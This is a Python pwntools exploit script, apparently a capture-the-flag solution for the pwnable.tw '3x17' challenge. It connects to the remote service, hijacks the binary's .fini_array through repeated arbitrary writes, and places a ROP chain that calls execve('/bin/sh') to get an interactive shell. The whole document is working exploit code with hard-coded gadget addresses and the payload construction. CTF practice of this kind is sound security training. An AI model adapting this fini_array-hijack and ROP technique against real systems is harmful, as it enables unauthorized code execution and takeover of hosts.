#!/usr/bin/env python
from pwn import *
# p=process('./3x17')
p=remote('chall.pwnable.tw',10105)
elf=ELF('./3x17')
context.log_level='debug'

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def debugf(load=''):
    gdb.attach(p,load)
ru('addr:')


sl(str(0x4b40f8-0x8))
# sl('123')
ru('data:')
sl(p64(0x402960)+p64(0x401B6D))


rdi_ret=0x401696
rdx_rsi_ret=0x44a309
rax_ret=0x41e4af
syscall=0x44ABA8
rax=59
rdi=0x4b4140+8
rsi=0
rdx=0
fake_payload=p64(rdi_ret)+p64(rdi)
fake_payload+=p64(rdx_rsi_ret)+p64(rdx)+p64(rsi)
fake_payload+=p64(rax_ret)+p64(rax)
fake_payload+=p64(syscall)
fake_payload=fake_payload.ljust(72,'\x00')
fake_payload+='/bin/sh\x00'.ljust(24,'\x00')

for i in range(len(fake_payload)/24):
    ru('addr:')
    sd(str((0x4b40f0+0x10)+24*i))
    ru('data:')
    sd(fake_payload[24*i:24*(i+1)])

ru('addr:')
sl(str(0x4b40f8-0x8))

# debugf('nb 402988')
ru('data:')
sd(p64(0x401C4B)+p64(0x401C4c))
print('=====================')

p.interactive()